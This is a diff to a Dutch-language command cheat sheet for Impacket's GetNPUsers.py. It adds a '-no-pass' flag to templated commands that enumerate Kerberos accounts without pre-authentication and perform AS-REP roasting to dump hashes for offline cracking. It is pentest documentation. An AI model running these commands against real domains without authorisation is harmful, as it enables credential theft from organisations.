@@ -6,11 +6,11 @@
 
 - Ga over alle gebruikers met Kerberos pre-authentication uitgeschakeld (standaard anonieme enumeration):
 
-`GetNPUsers.py {{domein}}/ -usersfile {{pad/naar/gebruikerslijst}} -dc-ip {{domain_controller_ip}}`
+`GetNPUsers.py {{domein}}/ -usersfile {{pad/naar/gebruikerslijst}} -dc-ip {{domain_controller_ip}} -no-pass`
 
 - Voer AS-REP roasting uit en dump kraakbare hashes voor offline kraking:
 
-`GetNPUsers.py {{domein}}/ -usersfile {{pad/naar/gebruikerslijst}} -dc-ip {{domain_controller_ip}} -request`
+`GetNPUsers.py {{domein}}/ -usersfile {{pad/naar/gebruikerslijst}} -dc-ip {{domain_controller_ip}} -no-pass -request`
 
 - Authenticeer met valide credentials (als anonieme binding is uitgeschakeld):
 
